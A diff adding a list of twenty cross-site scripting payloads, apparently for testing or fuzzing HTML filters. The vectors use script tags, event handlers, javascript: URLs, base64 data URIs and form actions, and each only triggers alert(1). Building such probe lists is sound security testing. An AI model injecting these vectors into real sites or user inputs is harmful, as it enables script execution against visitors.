@@ -1,0 +1,20 @@
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<a href="javascript:alert(1)">Click here</a>
+<svg onload=alert(1)>
+<iframe src="javascript:alert(1)"></iframe>
+<body onload=alert(1)>
+<math><maction actiontype="statusline#http://google.com" xlink:href="javascript:alert(1)">CLICKME</maction></math>
+<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
+<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></embed>
+<script>eval(atob("YWxlcnQoMSk="))</script>
+<img src="data:image/png;base64,iVBORw0KGgo=" onload="alert(1)">
+<link rel="stylesheet" href="javascript:alert(1)">
+<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
+<base href="javascript:alert(1)//">
+<form action="javascript:alert(1)"><input type=submit></form>
+<button formaction="javascript:alert(1)">X</button>
+<input type="image" src="x" onerror="alert(1)">
+<video poster="javascript:alert(1)"></video>
+<audio src="x" onerror="alert(1)"></audio>
+<source src="javascript:alert(1)">
